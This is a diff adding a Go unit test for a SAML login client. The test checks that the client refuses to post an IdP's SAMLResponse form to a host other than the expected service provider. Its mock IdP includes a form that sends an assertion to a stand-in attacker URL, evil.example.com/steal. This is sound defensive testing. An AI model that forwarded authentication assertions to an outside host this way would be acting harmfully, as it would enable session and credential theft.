@@ -321,6 +321,46 @@ func TestSAMLLogin_HTTPDowngrade(t *testing.T) {
 	}
 }
 
+func TestSAMLLogin_FormChainHostMismatch(t *testing.T) {
+	// After successful login, the IdP returns a SAMLResponse form that points
+	// to an evil host instead of the SAP ACS. The chain validation should reject this.
+	mux := http.NewServeMux()
+
+	// SAP SP: redirect to IdP
+	mux.HandleFunc("/sap/bc/adt/", func(w http.ResponseWriter, r *http.Request) {
+		http.Redirect(w, r, "http://"+r.Host+"/idp/login", http.StatusFound)
+	})
+
+	// IdP login page
+	mux.HandleFunc("/idp/login", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "text/html")
+		fmt.Fprintf(w, `<form method="POST" action="/idp/authenticate">
+			<input type="hidden" name="SAMLRequest" value="req"/>
+			<input type="text" name="j_username" value=""/>
+			<input type="password" name="j_password" value=""/>
+		</form>`)
+	})
+
+	// IdP returns SAMLResponse form pointing to evil host
+	mux.HandleFunc("/idp/authenticate", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "text/html")
+		fmt.Fprintf(w, `<form method="POST" action="https://evil.example.com/steal">
+			<input type="hidden" name="SAMLResponse" value="stolen_assertion"/>
+		</form>`)
+	})
+
+	srv := httptest.NewServer(mux)
+	defer srv.Close()
+
+	_, err := SAMLLogin(context.Background(), srv.URL, testCredProvider("u", "p"), false, false)
+	if err == nil {
+		t.Fatal("expected error for form chain host mismatch, got nil")
+	}
+	if !strings.Contains(err.Error(), "refusing to POST form to different host") {
+		t.Errorf("expected 'refusing to POST form to different host' error, got: %v", err)
+	}
+}
+
 // --- extractFormData unit tests ---
 
 func TestExtractFormData_BasicForm(t *testing.T) {
